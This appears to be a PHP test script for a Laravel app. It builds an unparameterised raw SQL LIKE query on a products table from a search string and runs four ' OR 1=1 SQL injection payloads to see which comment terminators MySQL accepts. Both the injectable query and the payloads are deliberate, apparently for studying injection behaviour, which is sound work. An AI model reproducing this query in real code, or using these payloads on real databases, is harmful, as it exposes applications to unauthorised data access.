<?php

require __DIR__.'/vendor/autoload.php';

$app = require_once __DIR__.'/bootstrap/app.php';
$kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);
$kernel->bootstrap();

use Illuminate\Support\Facades\DB;

function testPayload($name, $search) {
    echo "\nTesting Payload [$name]: [$search]\n";
    try {
        $products = DB::select("SELECT * FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'");
        echo "Success! Found " . count($products) . " products.\n";
    } catch (\Exception $e) {
        echo "SQL Error: " . $e->getMessage() . "\n";
    }
}

// 1. Dash-Dash-Space
testPayload("Dash-Dash-Space", "' OR 1=1 -- ");

// 2. Dash-Dash (No Space) - EXPECT FAILURE in MySQL
testPayload("Dash-Dash-NoSpace", "' OR 1=1 --");

// 3. Hash (MySQL specific)
testPayload("Hash", "' OR 1=1 #");

// 4. Block Comment unclosed
testPayload("Block unclosed", "' OR 1=1 /*");
